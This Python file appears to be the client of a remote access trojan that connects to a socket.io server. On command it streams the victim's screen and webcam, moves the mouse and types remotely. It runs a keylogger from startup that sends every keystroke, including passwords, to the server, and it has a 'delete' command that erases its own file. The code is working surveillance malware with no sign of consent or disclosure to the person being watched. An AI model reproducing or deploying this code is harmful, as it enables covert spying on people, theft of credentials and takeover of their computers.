import socketio
import cv2
import numpy as np
import base64
import mss
import pyautogui
import time
import os
import sys
import random
from pynput import keyboard


# --- CONFIG ---
SERVER_URL = "http://localhost:3000"
PC_NAME = os.getlogin() + "-" + str(random.randint(1000, 9999))
# --------------

sio = socketio.Client()
connected = False

# Get screen dimensions once for coordinate calculation
with mss.mss() as sct:
    monitor_info = sct.monitors[1]
    screen_width = monitor_info["width"]
    screen_height = monitor_info["height"]

@sio.event
def connect():
    global connected
    connected = True
    print(f"Connected! Registering as {PC_NAME}...")
    sio.emit("register_home", PC_NAME)

@sio.event
def disconnect():
    global connected
    connected = False
    print("Disconnected from server")
    
    
@sio.on("delete")
def delete():
    os.remove(__file__)
    sys.exit()
  
# --- Remote Control Handler ---
@sio.event
def control_command(payload):
    try:
        cmd_type = payload.get("type")
        data = payload.get("data")

        if cmd_type == "mousemove":
            x = int(data["x"] * screen_width)
            y = int(data["y"] * screen_height)
            pyautogui.moveTo(x, y, _pause=False)
        
        elif cmd_type == "click":
            btn = data.get("button", "left")
            pyautogui.click(button=btn)

        elif cmd_type == "keypress":
            key = data.get("key")
            pyautogui.press(key)
        
        elif cmd_type == "type":
            text = data.get("text")
            pyautogui.write(text)

    except Exception as e:
        print(f"Control error: {e}")


isSendScreenOn = False
isSendCameraOn = False
@sio.on("stop")
def delete():
    global isSendScreenOn, isSendCameraOn
    isSendScreenOn = False
    isSendCameraOn = False
    print("sttopped")
    
@sio.on("sendScreen")
def sendScreen():
    global isSendScreenOn
    print("sendScreen")
    isSendScreenOn = True
    send_screen()
    
@sio.on("sendCamera")
def sendCamera():
    global isSendCameraOn, cap
    print("sendCamera")
    if not isSendCameraOn:
        try:
            cap = cv2.VideoCapture(0)
            isSendCameraOn = True
            send_camera(cap)
        
        except Exception as e:
            print(f"Capture error: {e}")
            
    else:
        isSendCameraOn = False

def send_screen():
    if not connected:
        return
    
    if not isSendScreenOn:
        return

    try:
        # FIX: Initialize mss inside the loop to avoid thread errors
        with mss.mss() as sct:
            # Capture Screen
            raw = sct.grab(sct.monitors[1])
            screen_np = np.array(raw)
            # Convert BGRA to BGR
            screen_bgr = cv2.cvtColor(screen_np, cv2.COLOR_BGRA2BGR)
            
            # Encode (Quality 50 for speed)
            _, sbuf = cv2.imencode(".jpg", screen_bgr, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            sio.emit("screen", base64.b64encode(sbuf).decode(), callback=send_screen)

    except Exception as e:
        print(f"Capture error: {e}")
    
def send_camera(cap):
    if not connected:
        return
    
    if not cap:
        print("invalid cap")
        return
    
    if not isSendCameraOn:
        cap.release()
        sio.emit("camera", "", callback=None)
        return

    try:
        def sendCameraAgain():
            send_camera(cap)
        # Capture Camera
        if cap.isOpened():
            ret, cam = cap.read()
            if ret:
                _, cbuf = cv2.imencode(".jpg", cam, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                sio.emit("camera", base64.b64encode(cbuf).decode(), callback=sendCameraAgain)

    except Exception as e:
        print(f"Capture error: {e}")
    
def on_press(key):
    keystrokes = ""
    if hasattr(key, "char") and key.char is not None:
        keystrokes = str(key.char)
    elif key == keyboard.Key.space:
        keystrokes = str(" ")
    elif key == keyboard.Key.enter:
        keystrokes = str(" [ENTER] ")
    elif key == keyboard.Key.backspace:
        keystrokes = str(" [BACKSPACE] ")
    else:
        keystrokes = str(" [" + str(key).replace("Key.", "").upper() + "] ")
    if sio.connected:
        sio.emit('keyinput', keystrokes)
        
listener = keyboard.Listener(on_press=on_press)
listener.daemon = True
listener.start()

if __name__ == "__main__":
    try:
        sio.connect(SERVER_URL)
        sio.wait()
    except KeyboardInterrupt:
        cap.release()
        print("Stopped.")
    except Exception as e:
        print(f"Connection Failed: {e}")